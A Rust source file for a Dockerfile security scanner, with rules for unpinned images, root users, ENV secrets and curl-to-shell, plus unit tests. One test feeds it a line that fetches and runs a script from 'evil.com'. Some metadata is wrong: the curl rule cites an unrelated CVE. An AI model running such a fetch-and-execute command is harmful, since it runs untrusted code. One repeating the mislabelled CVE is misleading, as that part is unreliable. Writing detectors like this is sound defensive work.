use crate::{DiscoveryMethod, Finding, Language, ScanConfig, Severity};
use std::path::Path;

pub struct DockerAnalyzer;

impl Default for DockerAnalyzer {
    fn default() -> Self {
        Self
    }
}

impl super::LanguageAnalyzer for DockerAnalyzer {
    fn language(&self) -> Language {
        Language::Docker
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["dockerfile"]
    }

    fn analyze(&self, content: &str, file_path: &Path, _config: &ScanConfig) -> Vec<Finding> {
        let mut findings = Vec::new();

        for (i, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            let lineno = i as u32 + 1;

            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }

            if trimmed.starts_with("FROM ") {
                let lower = trimmed.to_lowercase();
                if lower.contains(":latest") || !lower.contains(':') {
                    findings.push(make_finding(
                        file_path, lineno, trimmed,
                        Severity::Medium,
                        "CWE-1104",
                        "Unpinned base image tag",
                        "Pin base image to a specific digest or version tag (e.g. `FROM ubuntu:22.04` instead of `FROM ubuntu` or `FROM ubuntu:latest`).",
                        0.85,
                    ));
                }
            }

            if trimmed.to_lowercase().contains("apt-get install") && !trimmed.contains("--no-install-recommends") {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Low,
                    "CWE-829",
                    "apt-get without --no-install-recommends",
                    "Add `--no-install-recommends` to apt-get install to avoid pulling unnecessary packages and reducing attack surface.",
                    0.7,
                ));
            }

            if trimmed.starts_with("USER ") && trimmed.len() > 5 {
                let user = trimmed[5..].trim();
                if user.eq_ignore_ascii_case("root") || user == "0" {
                    findings.push(make_finding(
                        file_path, lineno, trimmed,
                        Severity::High,
                        "CWE-250",
                        "Running as root",
                        "Avoid running containers as root. Add a `USER` directive with a non-root user. Use `USER 1000` or create a dedicated user.",
                        0.9,
                    ));
                }
            }

            if trimmed.starts_with("EXPOSE ") && trimmed.contains("0.0.0.0") {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Low,
                    "CWE-200",
                    "Expose binds to all interfaces",
                    "EXPOSE 0.0.0.0:port binds to all interfaces. Bind only to specific interfaces or use Docker's internal networking.",
                    0.6,
                ));
            }

            if trimmed.starts_with("ADD ") {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Low,
                    "CWE-829",
                    "ADD instead of COPY",
                    "Prefer COPY over ADD. ADD has implicit behavior (tar extraction, remote URLs) that can introduce unexpected files.",
                    0.65,
                ));
            }

            let lower = trimmed.to_lowercase();
            if lower.starts_with("env ") {
                let secret_kws = ["password", "secret", "token", "api_key", "apikey", "access_key", "private_key"];
                if secret_kws.iter().any(|kw| lower.contains(kw)) {
                    findings.push(make_finding(
                        file_path, lineno, trimmed,
                        Severity::High,
                        "CWE-798",
                        "Hardcoded secret in ENV",
                        "Use Docker secrets (--secret) or build args with external secret stores instead of hardcoding secrets in ENV.",
                        0.9,
                    ));
                }
            }

            if trimmed.starts_with("COPY ") && trimmed.contains("--from=") {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Info,
                    "CWE-200",
                    "Multi-stage copy from other image",
                    "Verify that the source image for COPY --from= is trusted and up-to-date. Consider pinning intermediate images by digest.",
                    0.5,
                ));
            }

            if lower.contains("curl") && lower.contains("|") && (lower.contains("bash") || lower.contains("sh")) {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Critical,
                    "CWE-494",
                    "curl-to-bash pattern (CVE-2024-2398)",
                    "Avoid piping curl output directly to shell. Download the script, verify checksum/signature, then execute. Consider using package manager instead.",
                    0.95,
                ));
            }

            if trimmed.starts_with("RUN ") && !lower.contains("apt-get") && !lower.contains("apk") && !lower.contains("yum") && !lower.contains("dnf") && lower.contains("rm -rf") {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Medium,
                    "CWE-22",
                    "File deletion in RUN layer",
                    "Deleting files in a RUN layer does not reduce image size. Use multi-stage builds or delete in the same RUN layer to actually remove files.",
                    0.75,
                ));
            }

            if trimmed.starts_with("HEALTHCHECK ") && !trimmed.contains("NONE") {
                if !trimmed.contains("--retries") && !trimmed.contains("--timeout") {
                    findings.push(make_finding(
                        file_path, lineno, trimmed,
                        Severity::Info,
                        "CWE-1069",
                        "HEALTHCHECK without retries/timeout",
                        "Configure --retries and --timeout in HEALTHCHECK to handle transient failures and prevent cascading restarts.",
                        0.55,
                    ));
                }
            }

            if trimmed.starts_with("SHELL ") && (lower.contains("sh") || lower.contains("bash")) {
                findings.push(make_finding(
                    file_path, lineno, trimmed,
                    Severity::Info,
                        "CWE-693",
                        "SHELL directive changes shell",
                        "Changing the SHELL to sh/bash from the default /bin/sh may introduce shell injection vectors. Ensure shell is properly quoted in CMD/ENTRYPOINT.",
                        0.4,
                ));
            }
        }

        findings
    }
}

fn make_finding(
    file_path: &Path,
    line_number: u32,
    snippet: &str,
    severity: Severity,
    cwe: &str,
    title: &str,
    remediation: &str,
    confidence: f32,
) -> Finding {
    Finding {
        id: crate::new_finding_id(),
        severity,
        cwe: Some(cwe.to_string()),
        cve: None,
        description: format!("{} — {}", title, cwe),
        file_path: Some(file_path.to_path_buf()),
        line_number: Some(line_number),
        vulnerable_code_snippet: Some(snippet.trim().to_string()),
        remediation: Some(remediation.to_string()),
        confidence,
        discovery_method: DiscoveryMethod::StaticPatternMatching,
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::analyzers::LanguageAnalyzer;
    use std::path::PathBuf;

    fn analyze(content: &str) -> Vec<Finding> {
        let analyzer = DockerAnalyzer;
        analyzer.analyze(content, &PathBuf::from("Dockerfile"), &ScanConfig::default())
    }

    #[test]
    fn test_unpinned_base_image() {
        let findings = analyze("FROM ubuntu:latest");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-1104")));
    }

    #[test]
    fn test_unpinned_no_tag() {
        let findings = analyze("FROM node");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-1104")));
    }

    #[test]
    fn test_pinned_image_ok() {
        let findings = analyze("FROM ubuntu:22.04");
        assert!(!findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-1104")));
    }

    #[test]
    fn test_no_install_recommends() {
        let findings = analyze("RUN apt-get install -y python3");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-829")));
    }

    #[test]
    fn test_root_user() {
        let findings = analyze("USER root");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-250")));
    }

    #[test]
    fn test_non_root_user_ok() {
        let findings = analyze("USER 1000");
        assert!(!findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-250")));
    }

    #[test]
    fn test_add_instead_of_copy() {
        let findings = analyze("ADD app.tar.gz /app/");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-829")));
    }

    #[test]
    fn test_hardcoded_secret_env() {
        let findings = analyze("ENV DB_PASSWORD=supersecret");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-798")));
    }

    #[test]
    fn test_curl_pipe_bash() {
        let findings = analyze("RUN curl -sSL https://evil.com/install.sh | bash");
        assert!(findings.iter().any(|f| f.cwe.as_deref() == Some("CWE-494")));
    }

    #[test]
    fn test_multi_stage_copy() {
        let findings = analyze("COPY --from=builder /app/output /app/");
        assert!(findings.iter().any(|f| f.description.contains("Multi-stage")));
    }

    #[test]
    fn test_clean_dockerfile_ok() {
        let dockerfile = r#"FROM ubuntu:22.04
RUN apt-get update && apt-get install -y --no-install-recommends python3
USER 1000
COPY app.py /app/
EXPOSE 8080
HEALTHCHECK --interval=30s --timeout=3s --retries=3 CMD curl -f http://localhost:8080/ || exit 1
CMD ["python3", "app.py"]
"#;
        let findings = analyze(dockerfile);
        let critical_or_high: Vec<_> = findings.iter().filter(|f| f.severity == Severity::High || f.severity == Severity::Critical).collect();
        assert!(critical_or_high.is_empty(), "Clean Dockerfile should not have High/Critical findings, got: {:?}", critical_or_high);
    }
}
